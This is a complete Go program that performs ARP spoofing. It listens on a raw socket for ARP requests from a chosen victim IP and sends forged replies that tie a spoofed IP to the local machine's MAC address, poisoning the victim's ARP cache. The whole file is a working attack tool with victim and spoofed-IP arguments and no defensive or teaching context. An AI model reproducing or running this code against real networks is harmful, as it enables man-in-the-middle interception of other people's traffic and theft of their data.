package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"os"
	"syscall"
)

const (
	ethPIP     = 0x0800
	ethPARP    = 0x0806
	arpRequest = 1
	arpReply   = 2

	macAddrLen = 6
	ipAddrLen  = 4
	ethHdrLen  = 14
	arpHdrLen  = 28
	frameLen   = ethHdrLen + arpHdrLen
)

func htons(v uint16) uint16 {
	return (v<<8)&0xff00 | v>>8
}

func getLocalMACIP(ifname string) (net.HardwareAddr, net.IP, int, error) {
	iface, err := net.InterfaceByName(ifname)
	if err != nil {
		return nil, nil, 0, err
	}
	if len(iface.HardwareAddr) != macAddrLen {
		return nil, nil, 0, fmt.Errorf("invalid MAC address for %s", ifname)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, nil, 0, err
	}
	for _, addr := range addrs {
		var ip net.IP
		switch v := addr.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return iface.HardwareAddr, ip4, iface.Index, nil
		}
	}

	return nil, nil, 0, fmt.Errorf("no IPv4 address found for %s", ifname)
}

func parseIPv4(s string) (net.IP, error) {
	ip := net.ParseIP(s).To4()
	if ip == nil {
		return nil, fmt.Errorf("invalid IPv4 address: %s", s)
	}
	return ip, nil
}

func sendARPReply(fd int, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP, destMAC net.HardwareAddr) error {
	packet := make([]byte, frameLen)

	copy(packet[0:6], destMAC)
	copy(packet[6:12], senderMAC)
	binary.BigEndian.PutUint16(packet[12:14], ethPARP)

	arp := packet[ethHdrLen:]
	binary.BigEndian.PutUint16(arp[0:2], 1)
	binary.BigEndian.PutUint16(arp[2:4], ethPIP)
	arp[4] = macAddrLen
	arp[5] = ipAddrLen
	binary.BigEndian.PutUint16(arp[6:8], arpReply)
	copy(arp[8:14], senderMAC)
	copy(arp[14:18], senderIP.To4())
	copy(arp[18:24], targetMAC)
	copy(arp[24:28], targetIP.To4())

	_, err := syscall.Write(fd, packet)
	if err != nil {
		return err
	}

	fmt.Printf("[+] Sent ARP reply: %s is at %s\n", senderIP, senderMAC)
	return nil
}

func run(ifname, victimIPStr, spoofedIPStr string) error {
	myMAC, myIP, ifindex, err := getLocalMACIP(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	victimIP, err := parseIPv4(victimIPStr)
	if err != nil {
		return errors.New("invalid victim IP: " + victimIPStr)
	}
	spoofedIP, err := parseIPv4(spoofedIPStr)
	if err != nil {
		return errors.New("invalid spoofed IP: " + spoofedIPStr)
	}

	fmt.Printf("[*] Local MAC: %s\n", myMAC)
	fmt.Printf("[*] Local IP : %s\n", myIP)
	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIPStr, spoofedIPStr)

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPARP)))
	if err != nil {
		return fmt.Errorf("socket(AF_PACKET): %w\nHint: run as root or with CAP_NET_RAW", err)
	}
	defer syscall.Close(fd)

	sll := &syscall.SockaddrLinklayer{
		Protocol: htons(ethPARP),
		Ifindex:  ifindex,
	}
	if err := syscall.Bind(fd, sll); err != nil {
		return fmt.Errorf("bind: %w", err)
	}

	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)

	buffer := make([]byte, 1514)
	for {
		n, _, err := syscall.Recvfrom(fd, buffer, 0)
		if err != nil {
			return fmt.Errorf("recv: %w", err)
		}
		if n < frameLen {
			continue
		}
		if binary.BigEndian.Uint16(buffer[12:14]) != ethPARP {
			continue
		}

		arp := buffer[ethHdrLen:]
		if binary.BigEndian.Uint16(arp[6:8]) != arpRequest {
			continue
		}
		if !net.IP(arp[24:28]).Equal(spoofedIP) {
			continue
		}
		if !net.IP(arp[14:18]).Equal(victimIP) {
			continue
		}

		senderMAC := net.HardwareAddr(append([]byte(nil), arp[8:14]...))
		senderIP := net.IP(append([]byte(nil), arp[14:18]...))

		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, senderIP, senderMAC)

		if err := sendARPReply(fd, myMAC, spoofedIP, senderMAC, senderIP, senderMAC); err != nil {
			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
		}
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <interface> <victim_ip> <spoofed_ip>\n", os.Args[0])
		os.Exit(1)
	}

	if err := run(os.Args[1], os.Args[2], os.Args[3]); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
